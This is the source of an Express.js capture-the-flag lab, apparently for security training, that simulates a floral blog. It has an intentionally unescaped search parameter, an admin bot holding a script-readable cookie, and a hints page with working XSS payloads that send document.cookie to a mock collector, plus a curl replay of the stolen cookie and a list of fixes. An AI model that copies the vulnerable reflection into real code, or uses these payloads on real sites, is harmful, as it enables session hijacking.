'use strict';
// VulnLab C02 — "Floral Leak" — XSS Reflected + Admin Bot + Report
//
// Scénario :
//   - Blog "Floral Corner" — contenu botanique/floral
//   - Le flag est caché dans /archives, visible uniquement avec le cookie admin_session valide
//   - Un bot admin visite les URLs signalées via POST /report avec son cookie admin
//   - La XSS dans /search?q= permet d'exfiltrer document.cookie du bot vers /collect
//   - Le joueur lit le cookie capturé sur /logs, le pose manuellement, visite /archives → FLAG
//
// Contraintes :
//   - admin_session n'est JAMAIS posé dans le navigateur du joueur
//   - Pas de route /steal qui injecte le cookie automatiquement
//   - Le joueur doit exploiter la XSS + bot pour obtenir le cookie

const express      = require('express');
const cookieParser = require('cookie-parser');
const crypto       = require('crypto');
const path         = require('path');
const puppeteer    = require('puppeteer-core');

const app  = express();
const PORT = 3000;

const CHROMIUM = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser';

// Domaines et port autorisés pour le bot admin (restriction anti-SSRF)
const BOT_ALLOWED_HOSTS = new Set(['localhost', '127.0.0.1']);
const BOT_ALLOWED_PORT  = String(PORT);

const ADMIN_TOKEN_BYTES      = 24;
const MAX_COLLECTED_DATA_LEN = 2000;
const MAX_COLLECTED_ENTRIES  = 100;
const MAX_ERROR_MSG_LEN      = 120;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());
app.use('/public', express.static(path.join(__dirname, 'public')));

// Token admin — généré au démarrage, jamais exposé côté joueur directement
const ADMIN_TOKEN = crypto.randomBytes(ADMIN_TOKEN_BYTES).toString('hex');
const FLAG        = 'FLAG{fl0r4l_l34k_xss_b0t_4dm1n_r3p0rt}';

// Buffer d'exfiltration : simule le serveur de l'attaquant (webhook)
const collected = [];

const accounts = {};

function genToken() { return crypto.randomBytes(16).toString('hex'); }

function currentUser(req) {
  const t = req.cookies['session'];
  if (!t) return null;
  const e = Object.entries(accounts).find(([, v]) => v.token === t);
  return e ? { username: e[0], role: 'user' } : null;
}

function hasAdminCookie(req) {
  return req.cookies['admin_session'] === ADMIN_TOKEN;
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
}

function renderPage({ title, body, user }) {
  const links = user
    ? `<a href="dashboard">Accueil</a><a href="search">Recherche</a><a href="archives">Archives</a><a href="report">Signaler</a><a href="logs">Logs</a>`
    : '';
  const auth = user
    ? `<div class="nav-user">
         <span class="nav-username">👤 ${escHtml(user.username)}</span>
         <a class="btn-logout" href="logout">Déconnexion</a>
       </div>`
    : `<div class="nav-auth-btns">
         <a class="btn-nav-login" href="login">Connexion</a>
         <a class="btn-nav-reg" href="register">Inscription</a>
       </div>`;
  return `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escHtml(title)} — Floral Corner</title>
<link rel="stylesheet" href="public/css/style.css">
<style>
.auth-wrap{display:flex;align-items:center;justify-content:center;min-height:calc(100vh - 110px);padding:24px}
.auth-card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.10);padding:44px 48px;width:100%;max-width:420px}
.auth-card h1{font-size:24px;font-weight:700;color:#1a2744;margin-bottom:6px;text-align:center}
.auth-subtitle{font-size:14px;color:#8a94a6;text-align:center;margin-bottom:28px}
.auth-card label{display:block;font-size:12px;font-weight:600;color:#4a5568;margin-bottom:6px;letter-spacing:.03em;text-transform:uppercase}
.auth-card input[type=text],.auth-card input[type=password]{width:100%;padding:12px 14px;border:1.5px solid #e2e8f0;border-radius:10px;font-size:14px;color:#1a2744;background:#fafbff;outline:none;transition:border-color .15s,box-shadow .15s;margin-bottom:18px}
.auth-card input:focus{border-color:#2d6ef7;background:#fff;box-shadow:0 0 0 3px rgba(45,110,247,.10)}
.btn-primary{display:block;width:100%;padding:13px;background:#2d6ef7;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;margin-top:4px;letter-spacing:.01em}
.btn-primary:hover{background:#1a5ce8}
.auth-switch{text-align:center;font-size:13px;color:#8a94a6;margin-top:22px}
.auth-switch a{color:#2d6ef7;font-weight:500;text-decoration:none}
.auth-switch a:hover{text-decoration:underline}
.alert-err{background:#fef2f2;border:1px solid #fecaca;color:#991b1b;border-radius:8px;padding:11px 14px;font-size:13px;margin-bottom:18px}
.alert-ok{background:#f0fdf4;border:1px solid #bbf7d0;color:#166534;border-radius:8px;padding:11px 14px;font-size:13px;margin-bottom:18px}
.nav-auth-btns,.nav-user{display:flex;align-items:center;gap:10px;margin-left:auto}
.btn-nav-login{padding:6px 16px;border:1.5px solid rgba(255,255,255,.4);border-radius:8px;color:rgba(255,255,255,.9);font-size:13px;font-weight:500;text-decoration:none}
.btn-nav-login:hover{border-color:#fff;color:#fff}
.btn-nav-reg{padding:6px 16px;background:#fff;border:none;border-radius:8px;color:#2d6ef7;font-size:13px;font-weight:600;text-decoration:none}
.btn-nav-reg:hover{background:#f0f4ff}
.nav-username{font-size:13px;color:rgba(255,255,255,.9)}
.btn-logout{padding:5px 14px;border:1px solid rgba(255,255,255,.3);border-radius:6px;color:rgba(255,255,255,.8);font-size:12px;text-decoration:none}
.btn-logout:hover{border-color:#fff;color:#fff}
.info-tip{background:#f0f7ff;border:1px solid #bfdbfe;border-radius:10px;padding:14px 18px;font-size:14px;color:#1e40af;margin-top:24px;line-height:1.6}
.report-form{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.07);padding:32px;margin-top:24px;max-width:600px}
.report-form label{display:block;font-size:12px;font-weight:600;color:#4a5568;margin-bottom:8px;text-transform:uppercase;letter-spacing:.03em}
.report-form input[type=text]{width:100%;padding:12px 14px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:14px;color:#1a2744;background:#fafbff;outline:none;margin-bottom:16px}
.report-form input:focus{border-color:#2d6ef7;box-shadow:0 0 0 3px rgba(45,110,247,.10)}
.log-entry{background:#1e2330;border:1px solid #2d3548;border-radius:8px;padding:14px 18px;margin-bottom:12px;font-family:monospace;font-size:13px;word-break:break-all}
.log-time{color:#64748b;font-size:11px;margin-bottom:4px}
.log-data{color:#7dd3fc}
.empty-logs{color:#64748b;font-style:italic;padding:24px 0}
</style>
</head>
<body>
<nav class="navbar">
  <div class="nav-inner">
    <a class="brand" href="dashboard">🌸 Floral Corner</a>
    <div class="nav-links">${links}</div>
    ${auth}
  </div>
</nav>
<main>${body}</main>
<footer><div class="footer-inner">Floral Corner &copy; 2024 &nbsp;·&nbsp;
<span style="color:#e85d3c">VulnLab C02</span></div></footer>
</body></html>`;
}

function requireAuth(req, res, next) {
  if (!currentUser(req)) return res.redirect('login');
  next();
}

// ── GET / → redirect to /dashboard ──────────
app.get('/', (req, res) => res.redirect('dashboard'));

// ── REGISTER ────────────────────────────────
app.get('/register', (req, res) => {
  const err = req.query.err || '';
  res.send(renderPage({ title: 'Inscription', user: null, body: `
  <div class="auth-wrap"><div class="auth-card">
    <h1>Créer un compte</h1>
    <p class="auth-subtitle">Rejoignez Floral Corner pour lire nos articles</p>
    ${err ? `<div class="alert-err">⚠ ${escHtml(err)}</div>` : ''}
    <form method="POST" action="register">
      <label>Nom d'utilisateur</label>
      <input type="text" name="username" placeholder="ex: alice" required autocomplete="off">
      <label>Mot de passe</label>
      <input type="password" name="password" placeholder="••••••••" required>
      <button type="submit" class="btn-primary">Créer mon compte</button>
    </form>
    <p class="auth-switch">Déjà un compte ? <a href="login">Se connecter</a></p>
  </div></div>`}));
});

app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)  return res.redirect('register?err=Champs+manquants');
  if (username === 'admin')    return res.redirect('register?err=Ce+nom+est+réservé');
  if (accounts[username])      return res.redirect('register?err=Nom+déjà+utilisé');
  accounts[username] = { password, token: genToken() };
  res.redirect('login?registered=1');
});

// ── LOGIN ────────────────────────────────────
app.get('/login', (req, res) => {
  const err = req.query.err || '';
  const ok  = req.query.registered
    ? '<div class="alert-ok">✓ Compte créé avec succès ! Connectez-vous.</div>' : '';
  res.send(renderPage({ title: 'Connexion', user: null, body: `
  <div class="auth-wrap"><div class="auth-card">
    <h1>Connexion</h1>
    <p class="auth-subtitle">Accédez à votre espace Floral Corner</p>
    ${ok}
    ${err ? `<div class="alert-err">⚠ ${escHtml(err)}</div>` : ''}
    <form method="POST" action="login">
      <label>Nom d'utilisateur</label>
      <input type="text" name="username" placeholder="ex: alice" required autocomplete="off">
      <label>Mot de passe</label>
      <input type="password" name="password" placeholder="••••••••" required>
      <button type="submit" class="btn-primary">Se connecter</button>
    </form>
    <p class="auth-switch">Pas encore de compte ? <a href="register">S'inscrire</a></p>
  </div></div>`}));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const acc = accounts[username];
  if (!acc || acc.password !== password)
    return res.redirect('login?err=Identifiants+incorrects');
  res.cookie('session',  acc.token, { path: '/', httpOnly: true });
  res.cookie('username', username,  { path: '/', httpOnly: false });
  res.redirect('dashboard');
});

app.get('/logout', (req, res) => {
  res.clearCookie('session');
  res.clearCookie('username');
  res.redirect('login');
});

// ── DASHBOARD ────────────────────────────────
app.get('/dashboard', requireAuth, (req, res) => {
  const user = currentUser(req);
  res.send(renderPage({ title: 'Accueil', user, body: `
  <div class="page-wrap">
    <div class="article-header">
      <span class="article-tag">Botanique</span>
      <h1>Les orchidées : guide de culture et d'entretien</h1>
      <p class="article-meta">Par <strong>admin</strong> · 12 mars 2024 · 6 min de lecture</p>
    </div>
    <div class="article-body">
      <p>Les orchidées (famille des Orchidaceae) comptent parmi les familles de plantes
      les plus diversifiées au monde avec plus de 25 000 espèces répertoriées.
      Leur culture peut sembler délicate, mais quelques règles simples suffisent
      pour les faire s'épanouir chez vous.</p>
      <p>Dans nos <a href="archives">archives</a>, l'admin partage ses notes de culture
      exclusives — réservées aux membres avec accès spécial.</p>
    </div>
    <div class="info-tip">
      🌸 Utilisez la <a href="search" style="color:#1e40af;font-weight:500">recherche</a>
      pour explorer nos articles botaniques.
      Vous pouvez aussi <a href="report" style="color:#1e40af;font-weight:500">signaler</a>
      un contenu à l'équipe d'administration.
    </div>
  </div>`}));
});

// ── SEARCH — ⚠️ XSS REFLECTED ───────────────
// q est reflété SANS échappement → XSS reflected
// Aucun cookie admin_session n'est posé ici
app.get('/search', requireAuth, (req, res) => {
  const user = currentUser(req);
  const q    = req.query.q || '';

  // ⚠️ VULNÉRABILITÉ : q reflété sans échappement HTML
  const results = q
    ? `<div class="search-results">
         <p class="search-info">Résultats pour : <strong>${q}</strong></p>
         <p class="no-results">Aucun article ne correspond à votre recherche.</p>
       </div>`
    : `<p style="font-size:14px;color:#8a94a6;margin-top:16px">Entrez un mot-clé pour rechercher.</p>`;

  res.send(renderPage({ title: 'Recherche', user, body: `
  <div class="page-wrap">
    <h1>Recherche d'articles</h1>
    <form class="search-form" method="GET" action="search">
      <input type="text" name="q" placeholder="ex: orchidée, rose, tulipe…"
             value="${escHtml(q)}" class="search-input">
      <button type="submit" class="btn-submit">Rechercher</button>
    </form>
    ${results}
  </div>`}));
});

// ── ARCHIVES — Flag visible uniquement avec admin_session valide
app.get('/archives', (req, res) => {
  const user    = currentUser(req);
  const isAdmin = hasAdminCookie(req);

  const content = isAdmin
    ? `<div class="flag-banner">
         <div class="flag-icon">🚩</div>
         <div>
           <div class="flag-label">C02 — Floral Leak — Flag !</div>
           <div class="flag-val">${FLAG}</div>
         </div>
       </div>
       <div class="admin-note" style="margin-top:16px">
         Notes privées de l'admin — accès autorisé.<br>
         <em>Les graines de Strelitzia reginae nécessitent 3 mois de stratification…</em>
       </div>`
    : `<div class="info-note">
         🔒 Cette section est réservée à l'administrateur.<br>
         <span style="font-size:13px;color:#8a94a6">
           Vous devez posséder le cookie <code>admin_session</code> valide pour accéder aux archives.
         </span>
       </div>`;

  res.send(renderPage({ title: 'Archives', user, body: `
  <div class="page-wrap">
    <h1>Archives — Notes d'administration</h1>
    ${content}
  </div>`}));
});

// ── REPORT — Formulaire de signalement ───────
app.get('/report', requireAuth, (req, res) => {
  const user = currentUser(req);
  const err  = req.query.err || '';
  const ok   = req.query.ok  || '';
  res.send(renderPage({ title: 'Signaler', user, body: `
  <div class="page-wrap">
    <h1>Signaler une page à l'admin</h1>
    <p style="color:#64748b;margin-top:8px;margin-bottom:0">
      L'administrateur vérifiera l'URL signalée manuellement.
      Si le contenu est inapproprié, il sera retiré.
    </p>
    ${err ? `<div class="alert-err" style="margin-top:16px">⚠ ${escHtml(err)}</div>` : ''}
    ${ok  ? `<div class="alert-ok"  style="margin-top:16px">✓ ${escHtml(ok)}</div>`  : ''}
    <div class="report-form">
      <form method="POST" action="report">
        <label>URL de la page à signaler</label>
        <input type="text" name="url" placeholder="http://localhost:3000/search?q=…" required>
        <button type="submit" class="btn-primary">Envoyer le signalement</button>
      </form>
    </div>
    <div class="info-tip" style="margin-top:20px">
      💡 <strong>Note :</strong> Le bot admin visite les URLs sur
      <code>http://localhost:3000/</code> (accès direct au serveur).
    </div>
  </div>`}));
});

// ── REPORT POST — Bot admin visite l'URL ─────
app.post('/report', requireAuth, async (req, res) => {
  const user = currentUser(req);
  const url  = (req.body.url || '').trim();

  if (!url) {
    return res.redirect('report?err=URL+manquante');
  }

  let parsedUrl;
  try {
    parsedUrl = new URL(url);
  } catch {
    return res.redirect('report?err=URL+invalide+(format+incorrect)');
  }

  if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
    return res.redirect('report?err=Protocole+non+autorisé+(http/https+uniquement)');
  }

  // Restriction anti-SSRF : le bot ne visite que les URLs sur localhost:3000
  if (!BOT_ALLOWED_HOSTS.has(parsedUrl.hostname)) {
    return res.redirect('report?err=Hôte+non+autorisé+(localhost+uniquement)');
  }
  const urlPort = parsedUrl.port || (parsedUrl.protocol === 'https:' ? '443' : '80');
  if (urlPort !== BOT_ALLOWED_PORT) {
    return res.redirect(`report?err=Port+non+autorisé+(port+${BOT_ALLOWED_PORT}+uniquement)`);
  }

  console.log(`[C02-bot] Admin visite : ${url}`);

  let browser;
  try {
    browser = await puppeteer.launch({
      executablePath: CHROMIUM,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
      ],
      headless: true,
    });

    const page = await browser.newPage();

    // Poser le cookie admin_session uniquement pour localhost
    // (pas le hostname de l'URL soumise — évite l'injection de cookie sur d'autres domaines)
    await page.setCookie({
      name:     'admin_session',
      value:    ADMIN_TOKEN,
      domain:   'localhost',
      path:     '/',
      httpOnly: false,   // accessible par JS → le joueur peut l'exfiltrer via XSS
    });

    await page.goto(url, { waitUntil: 'networkidle2', timeout: 10000 });
    // Attendre que d'éventuels scripts XSS s'exécutent
    await new Promise(r => setTimeout(r, 2000));

    await browser.close();
    browser = null;

    res.redirect('report?ok=L\'admin+a+visité+l\'URL.+Vérifiez+vos+logs.');
  } catch (e) {
    if (browser) { try { await browser.close(); } catch {} }
    console.error('[C02-bot] Erreur :', e.message);
    res.redirect(`report?err=${encodeURIComponent('Erreur du bot : ' + e.message.slice(0, MAX_ERROR_MSG_LEN))}`);
  }
});

// ── COLLECT — Webhook d'exfiltration ─────────
// Simule le serveur de l'attaquant qui reçoit les données volées
// (pas de requireAuth — le bot admin doit pouvoir y accéder)
app.get('/collect', (req, res) => {
  const data = req.query.c || req.query.data || req.query.cookie || '';
  if (data) {
    const entry = { time: new Date().toISOString(), data: data.substring(0, MAX_COLLECTED_DATA_LEN) };
    collected.push(entry);
    if (collected.length > MAX_COLLECTED_ENTRIES) collected.shift();
    console.log(`[C02-collect] Données reçues : ${entry.data.substring(0, 80)}`);
  }
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send('ok');
});

// ── LOGS — Consulter les données exfiltrées ──
app.get('/logs', requireAuth, (req, res) => {
  const user = currentUser(req);
  const entries = collected.length
    ? [...collected].reverse().map(e => `
      <div class="log-entry">
        <div class="log-time">${escHtml(e.time)}</div>
        <div class="log-data">${escHtml(e.data)}</div>
      </div>`).join('')
    : `<p class="empty-logs">Aucune donnée reçue pour l'instant.<br>
       Déclenchez la XSS via le bot admin pour exfiltrer le cookie.</p>`;

  res.send(renderPage({ title: 'Logs d\'exfiltration', user, body: `
  <div class="page-wrap">
    <h1>Logs — Données exfiltrées</h1>
    <p style="color:#64748b;margin-bottom:20px">
      Données reçues sur <code>/collect</code> (simule votre serveur d'écoute).
    </p>
    ${entries}
    ${collected.length ? `<form method="GET" action="logs" style="margin-top:16px">
      <button type="submit" class="btn-submit" style="font-size:13px;padding:8px 18px">↺ Rafraîchir</button>
    </form>` : ''}
  </div>`}));
});

// ── HINTS ─────────────────────────────────────
app.get('/hints', (req, res) => {
  const user = currentUser(req);
  res.send(renderPage({ title: 'Hints C02', user, body: `
  <div class="page-wrap">
    <h1>Challenge C02 — Floral Leak</h1>
    <p class="subtitle">Node.js · Express · XSS Reflected · Admin Bot · Cookie Hijacking</p>
    <p class="intro">
      Le blog <em>Floral Corner</em> possède une fonctionnalité de recherche vulnérable à la XSS.<br>
      Un bot admin visite les URLs signalées avec son cookie <code>admin_session</code>.<br>
      Le flag est dans <code>/archives</code>, accessible uniquement avec ce cookie.
    </p>

    <div class="hint-card">
      <div class="hint-level level-1">Étape 1 — Détecter la XSS dans /search</div>
      <pre class="code-block">http://localhost:3000/search?q=&lt;img src=x onerror=alert(1)&gt;
http://localhost:3000/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
    </div>

    <div class="hint-card">
      <div class="hint-level level-2">Étape 2 — Construire le payload d'exfiltration</div>
      <pre class="code-block">// Envoie document.cookie vers /collect
http://localhost:3000/search?q=&lt;script&gt;new Image().src='http://localhost:3000/collect?c='+document.cookie&lt;/script&gt;

// Alternative avec fetch
http://localhost:3000/search?q=&lt;script&gt;fetch('http://localhost:3000/collect?c='+document.cookie)&lt;/script&gt;</pre>
    </div>

    <div class="hint-card">
      <div class="hint-level level-2">Étape 3 — Faire visiter l'URL au bot admin</div>
      <pre class="code-block">// Allez sur /report et soumettez votre URL malveillante :
http://localhost:3000/search?q=&lt;script&gt;new Image().src='http://localhost:3000/collect?c='+document.cookie&lt;/script&gt;

// Le bot visite cette URL avec son cookie admin_session
// La XSS s'exécute dans son navigateur et envoie le cookie vers /collect</pre>
    </div>

    <div class="hint-card">
      <div class="hint-level level-3">Étape 4 — Récupérer le cookie admin dans /logs</div>
      <pre class="code-block">// Allez sur /logs pour voir les données reçues
// Vous verrez quelque chose comme :
admin_session=a1b2c3d4e5f6...  (token hexadécimal)</pre>
    </div>

    <div class="hint-card">
      <div class="hint-level level-3">Étape 5 — Utiliser le cookie pour accéder aux archives</div>
      <pre class="code-block">// Dans les DevTools du navigateur (Console) :
document.cookie = "admin_session=&lt;valeur_copiée&gt;;path=/"

// Ou via curl :
curl -b "admin_session=&lt;valeur_copiée&gt;" http://localhost:3000/archives

// Puis visitez /archives pour obtenir le flag</pre>
    </div>

    <h2>Correction</h2>
    <pre class="code-block">// ✅ Toujours échapper les paramètres reflétés
'Résultats pour : ' + escapeHtml(q)

// ✅ HttpOnly empêche l'accès JS au cookie admin
res.cookie('admin_session', token, { httpOnly: true, sameSite: 'Strict' })

// ✅ Valider les URLs soumises au bot
// ✅ Content-Security-Policy pour limiter les sources de scripts</pre>
  </div>`}));
});

app.listen(PORT, () => console.log('[C02-FloralLeak] port 3000'));
